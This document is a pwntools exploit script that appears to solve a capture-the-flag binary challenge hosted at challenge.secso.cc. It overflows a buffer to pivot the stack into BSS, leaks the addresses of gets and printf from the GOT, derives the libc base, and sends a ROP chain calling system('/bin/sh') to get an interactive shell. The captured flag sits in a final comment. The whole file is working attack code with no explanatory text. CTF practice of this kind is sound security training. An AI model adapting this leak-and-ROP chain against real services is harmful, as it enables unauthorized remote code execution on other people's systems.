from pwn import *
	
elf = context.binary = ELF("chal")
libc = elf.libc


# p = process()
p = remote("challenge.secso.cc", 8004)


printf_rbp_8 = 0x000000000040116d
ptr_ptr___libc_start_main = 0x4004d8
leave_ret = 0x000000000040119a
write_rbp_0x20 = 0x401188
pop_rbp = 0x000000000040113d 


p.sendline(cyclic(32) + p64(elf.bss(0x900) + 0x20) + p64(write_rbp_0x20))



print(hex(elf.bss(0x900)))
p.sendline(cyclic(7) + p64(elf.got.gets) + cyclic(32 - 7 - 8) + p64(elf.bss(0x900 + 7 + 8)) + p64(printf_rbp_8))

p.recvuntil("Hello! ")
p.recvuntil("Hello! ")
gets_leak = u64(p.recvline().strip().ljust(8,p8(0)))
print("gets leak",hex(gets_leak))


printf_addr = 0x404928
p.sendline(b"A" + p64(elf.got.printf + 1) +    cyclic(57 - 9) + p64(pop_rbp) + p64(printf_addr + 8) + p64(printf_rbp_8) )

p.recvuntil("Hello! ")
printf_leak = u64(p.recvline().strip().ljust(8,p8(0)))  << 8
print("printf leak",hex(printf_leak))



libc_base = printf_leak - 0x60100
str_bin_sh = libc_base + 0x1cb42f
system = libc_base + 0x58750
pop_rdi = libc_base + 0x000000000010f75b
ret = libc_base + 0x000000000002882f


print(hex(libc_base))
# gdb.attach(p,f"""
# # b *{0x0000000000401194}
# # b *_IO_getline_info+322
# # b *_IO_getline_info+104
# b *{pop_rbp}
# """)




p.sendline(cyclic(32) + flat([
    pop_rdi,
    str_bin_sh,
    system,
]))




p.interactive()


# K17{w04h_h0w_d1d_u_g37s_7h15}